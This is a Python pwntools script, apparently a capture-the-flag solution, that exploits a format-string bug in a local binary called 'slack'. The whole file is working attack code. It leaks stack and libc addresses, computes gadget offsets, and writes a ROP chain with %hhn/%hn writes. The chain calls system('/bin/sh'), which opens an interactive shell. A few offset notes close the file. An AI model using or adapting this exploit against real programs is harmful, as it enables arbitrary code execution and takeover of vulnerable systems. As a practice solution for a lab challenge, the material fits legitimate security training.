from pwn import *

io = process("./slack")
elf = context.binary = ELF('./slack')
libc = elf.libc
# io = gdb.debug("./slack", '''
# ''')
context.log_level = 'debug' 


payload = b'%1$p.%9$p'
io.recvuntil("nal):")
io.sendline(payload)
io.recvuntil("You:")


stack_leak, diff, libc_leak = io.recvline().strip().decode().partition('.')
libc.address = int(libc_leak, 16) - 2229920
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']
ret2 = libc.address + 0x00000000000f99ab
pop_rdi = libc.address + 0x000000000002a3e5
ret = int(stack_leak, 16) + 8600
io.recvuntil("al):")
var = int(stack_leak, 16)+8488
def AAA(gadget, ret, offset):
    for i in range(6):
        j = offset + i
        print(j)
        io.recvuntil("al):")
        io.sendline(f"%{int(str(hex(ret))[-2:], 16) + j}c%25$hhn")
        io.recvuntil("al):")
        if i == 0:
            io.sendline(f"%{int(str(hex(gadget))[-((i*2)+2):], 16)}c%55$hhn")
        else:
            io.sendline(f"%{int(str(hex(gadget))[-((i*2)+2):-(i*2)], 16)}c%55$hhn")

io.send(f"%{int(str(hex(var))[-4:], 16) + 3}c%25$hn")
io.recvuntil("al):")
io.sendline("%255c%55$hnn")
io.recvuntil("al):")
io.send(f"%{int(str(hex(ret))[-4:], 16) + 3}c%25$hn")
AAA(pop_rdi, ret, 0)
AAA(binsh, ret, 8)
AAA(ret2, ret, 16)
AAA(system, ret, 24)
io.recvuntil("al):")
io.send(f"%{int(str(hex(var))[-4:], 16) + 3}c%25$hn")
io.recvuntil("al):")
io.sendline("%33c%55$hn")
io.interactive()
'''
stack 1
libc 9
canary 19
'''